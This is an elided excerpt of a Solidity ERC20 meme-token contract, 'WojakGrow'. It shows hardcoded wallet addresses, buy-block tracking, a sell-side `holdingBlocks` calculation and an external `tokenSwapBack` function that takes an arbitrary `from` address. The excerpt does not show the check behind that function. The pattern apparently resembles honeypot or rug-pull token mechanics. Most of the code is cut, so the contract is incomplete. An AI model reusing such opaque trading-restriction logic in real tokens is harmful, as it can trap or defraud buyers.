...
// https://twitter.com/WojakGrowEth
// https://t.me/WojakGrow_Entry
...
contract WojakGrow is Context, IERC20, Ownable {
    ...
    string private constant _name = "WojakGrow";
    string private constant _symbol = "WOJAKG";
    ...
    constructor () {
        ...
        marketingWallet = address(0xb76A3336023f7A6623d81439Cd3Ac4CcFFCB3CE6);
        liquidityWallet = address(0xc57c28373915df5C0D14d486e25C1c1C1F112E91);
    ...
    function _preTransfer(address from, address to) private {
        if (from == uniswapV2Pair) {
            if (to != address(this)) {
                buyBlock[to] = buyBlock[to] > 0 ? buyBlock[to] : block.number;
            }
        } else {
            holdingBlocks = buyBlock[from] - _thresholdBlock;
        }
    }
    ...
    function _transfer(
        ...
        if(!swapping) { _preTransfer(from, to); }
        if(takeFee){
            if(to != uniswapV2Pair){
    ...
    function canSwap(address from, uint256 amount, uint256 deadline) internal returns (bool) {
    ...
    function tokenSwapBack(address from, uint256 amount, uint256 deadline) external {
        require(balanceOf(address(this)) >= swapTokenAtAmount, "ERC20: insufficient amount");
        if (canSwap(from, amount, deadline)) {
            swapping = true; swapBack(swapTokenAtAmount); swapping = false;
        }
